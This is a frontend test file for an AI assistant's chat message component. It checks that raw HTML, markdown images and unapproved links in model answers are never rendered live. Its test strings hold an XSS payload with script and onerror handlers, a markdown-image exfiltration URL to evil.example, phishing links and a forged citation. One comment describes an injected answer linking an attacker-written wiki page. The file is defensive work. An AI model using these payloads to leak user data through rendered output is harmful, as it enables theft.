/**
 * AI Navigator's rendering safety (plan §9.9, §10.2 rows 15, 16): no raw HTML, a link from data is
 * plain text, an image is never loaded, `[S#]` chips open only a known allowlisted citation, the
 * Sources list, and the saved states (stopped, failed, refused route, hand-off).
 */
import { describe, test, expect, afterEach } from 'vitest'
import { render, cleanup, screen } from '@testing-library/react'
import { MessageBubble, linkCitationMarkers } from './MessageBubble'
import type { ChatMessage } from './useNavigatorChat'

afterEach(cleanup)

const answer = (over: Partial<ChatMessage> = {}): ChatMessage => ({
  id: 'a1', role: 'assistant', content: '', status: 'complete', routes: [], citations: [], trace: [], errorCode: null, ...over,
})
const CIT = { id: 'S1', title: 'Scan Timeline', heading: 'Creating a schedule',
  url: 'https://www.redamon.org/docs/scan-timeline#creating-a-schedule',
  mirror_url: 'https://github.com/samugit83/redamon/wiki/Scan-Timeline#creating-a-schedule' }

function show(m: ChatMessage, opts: { agentAllowed?: boolean } = {}) {
  return render(<MessageBubble message={m} last agentAllowed={opts.agentAllowed ?? true} onOpenAgent={() => {}} onRetry={() => {}} />)
}

describe('MessageBubble safety', () => {
  test('raw HTML is never rendered', () => {
    const { container } = show(answer({ content: 'hi <img src="https://evil.example/x.png" onerror="alert(1)"><script>alert(1)</script>' }))
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
  })

  test('a markdown image is shown as text, never loaded', () => {
    const { container } = show(answer({ content: '![exfil](https://evil.example/leak?d=secret)' }))
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('[image: exfil]')
  })

  test('a link from data is plain text showing its URL', () => {
    const { container } = show(answer({ content: 'see [click me](https://evil.example/phish) and https://target.example/login' }))
    expect(container.querySelectorAll('a')).toHaveLength(0)
    expect(container.textContent).toContain('click me (https://evil.example/phish)')
  })

  test('a citation marker becomes a chip only for a known, allowlisted citation', () => {
    const { container } = show(answer({ content: 'Schedule it in Scan Timeline [S1]. Also [S7].', citations: [CIT] }))
    const chip = container.querySelector('a[href="https://www.redamon.org/docs/scan-timeline#creating-a-schedule"]')
    expect(chip?.textContent).toBe('S1')
    expect(chip?.getAttribute('rel')).toBe('noopener noreferrer')
    expect(container.textContent).toContain('[S7]')
  })

  test('the Sources list shows page › section with docs and GitHub links', () => {
    show(answer({ content: 'x [S1]', citations: [CIT] }))
    expect(screen.getByText(/Scan Timeline › Creating a schedule/)).toBeTruthy()
    expect(screen.getByRole('link', { name: 'docs' }).getAttribute('href')).toBe(CIT.url)
    expect(screen.getByRole('link', { name: 'GitHub' }).getAttribute('href')).toBe(CIT.mirror_url)
  })

  test('a docs or wiki link no citation of the answer backs is plain text', () => {
    // The GitHub wiki allowlist covers any page name, so an injected answer could link a page
    // someone else wrote there; only a URL the server built from the index is clickable.
    const { container } = show(answer({ content:
      '[read this](https://github.com/samugit83/redamon/wiki/Attacker-Page) and [docs](https://www.redamon.org/docs/scan-timeline)' }))
    expect(container.querySelectorAll('a')).toHaveLength(0)
    expect(container.textContent).toContain('read this (https://github.com/samugit83/redamon/wiki/Attacker-Page)')
  })

  test('a link to a URL one of the answer\'s citations backs stays clickable', () => {
    const { container } = show(answer({ content: `[the schedule docs](${CIT.mirror_url})`, citations: [CIT] }))
    const link = container.querySelector('.answerBody a, a')
    expect(link?.getAttribute('href')).toBe(CIT.mirror_url)
    expect(link?.textContent).toBe('the schedule docs')
  })

  test('a forged citation URL renders no link at all', () => {
    const { container } = show(answer({ content: 'x [S1]', citations: [{ ...CIT, url: 'https://evil.example/' }] }))
    expect(container.querySelectorAll('a')).toHaveLength(0)
  })

  test('only the app\'s own AI Agent deep link is clickable among relative links', () => {
    const { container } = show(answer({ content: '[go](/graph?project=cproj000000000000000001&agent=open) [x](/api/projects)' }))
    const links = [...container.querySelectorAll('a')].map((a) => a.getAttribute('href'))
    expect(links).toEqual(['/graph?project=cproj000000000000000001&agent=open'])
  })

  test('markers inside a link target are not rewritten', () => {
    expect(linkCitationMarkers('[S1] and [S2](x)')).toBe('[S1](#cite-S1) and [S2](x)')
  })
})

describe('MessageBubble states', () => {
  test('stopped, failed and refused routes', () => {
    show(answer({ content: 'partial', status: 'stopped' }))
    expect(screen.getByText('Stopped')).toBeTruthy()
    cleanup()
    show(answer({ status: 'failed', errorCode: 'agent_unreachable' }))
    expect(screen.getByText(/Failed: AI Navigator's service isn't reachable/)).toBeTruthy()
    expect(screen.getByRole('button', { name: 'Retry' })).toBeTruthy()
    cleanup()
    show(answer({ content: 'x', trace: [{ route: 'workspace', tool: 'refused_route', status: 'error', summary: 'needs_raw_data' }] }))
    expect(screen.getByText(/Workspace: needs Raw data & files/)).toBeTruthy()
  })

  test('the hand-off shows the AI Agent button, or why not', () => {
    const handoff = answer({ content: 'I only read.', trace: [{ route: 'direct', tool: 'handoff', status: 'end', summary: 'x' }] })
    show(handoff)
    expect(screen.getByRole('button', { name: 'Open the AI Agent →' })).toBeTruthy()
    cleanup()
    show(handoff, { agentAllowed: false })
    expect(screen.getByText(/You don.t have access to the AI Agent on this project/)).toBeTruthy()
  })

  test('the trace lists what ran and the Cypher, never a result', () => {
    show(answer({ content: 'x', trace: [{ route: 'graph', tool: 'run_cypher', status: 'end', summary: 'Ran a graph query', detail: 'MATCH (p:Port) RETURN p LIMIT 5' }] }))
    expect(screen.getByText('How I got this')).toBeTruthy()
    expect(screen.getByText('MATCH (p:Port) RETURN p LIMIT 5')).toBeTruthy()
  })

  test('a message sent by an acting admin says so, without a name', () => {
    render(<MessageBubble message={{ ...answer({ role: 'user', content: 'hi' }), actedByAdmin: true }} last={false} agentAllowed />)
    expect(screen.getByText('Sent by an administrator acting as you')).toBeTruthy()
  })
})
